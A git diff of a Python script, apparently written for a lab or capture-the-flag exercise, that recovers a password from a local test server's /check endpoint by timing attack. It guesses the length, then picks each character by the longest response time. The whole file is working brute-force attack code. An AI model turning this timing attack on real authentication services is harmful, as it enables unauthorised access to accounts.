@@ -9,6 +9,7 @@ class OnEstDesBrutes:
     def __init__(self):
         self.password = ''
         self.last_time = 0
+        self.password_len = 0
         self.url = "http://192.168.137.146:5000"
 
     def request_level(self, level: str):
@@ -21,9 +22,9 @@ class OnEstDesBrutes:
         else:
             print(f'Erreur : {response.status_code} : {response.text}')
     
-    def request(self, letter: str):
+    def request_pwd(self, letter: str):
         json = {
-            "password": self.password + letter
+            "password": (self.password + letter).ljust(self.password_len, '0')
         }
         response = requests.post(url=self.url + '/check', json=json, verify=False)
         if response.status_code == 200 or response.json()['result']:
@@ -35,25 +36,31 @@ class OnEstDesBrutes:
             print(f'Erreur : {response.status_code} : {response.text}')
             return
     
+    def brute_force_len_password(self):
+        while self.request_pwd('') == 0:
+            self.password_len += 1
+    
     def max_time(self, temps: list[int]) -> int | None:
-        i = temps.index(max(temps))
         if len(temps) < 2:
             return
+        i = temps.index(max(temps))
         tmp_mean = mean(temps[:i] + temps[i+1:])
         if temps[i] > tmp_mean + 15:
             return i
         
-    def brut_force_l(self) -> None:
+    def brute_force_char(self) -> None:
         time = []
         for l in self.car:
             t = -1
             while t < self.last_time:
-                t = self.request(l)
+                # Gère les erreurs si un temps est inormalement bas
+                t = self.request_pwd(l)
                 if t == None:
                     return
-                print(self.password + l, t)
+                print((self.password + l).ljust(self.password_len, '0'), t)
             
             time.append(t)
+            # Si un temps significatif prends ce caractère au lieu d'attendre la fin de tout les tests
             index = self.max_time(time)
             if index != None:
                 self.password += self.car[index]
@@ -63,11 +70,11 @@ class OnEstDesBrutes:
         self.last_time = max(time) - 20
         return 1
     
-    def brut_force_password(self, level: int = 0):
+    def brute_force_password(self, level: int = 0):
         self.request_level(level)
-        input('Go ?')
-        while self.brut_force_l():
+        input('Appuyez sur Entrée pour commencer...')
+        while self.brute_force_char():
             print(self.password)
 
 a = OnEstDesBrutes()
-a.brut_force_password('1')
+a.brute_force_password('0')
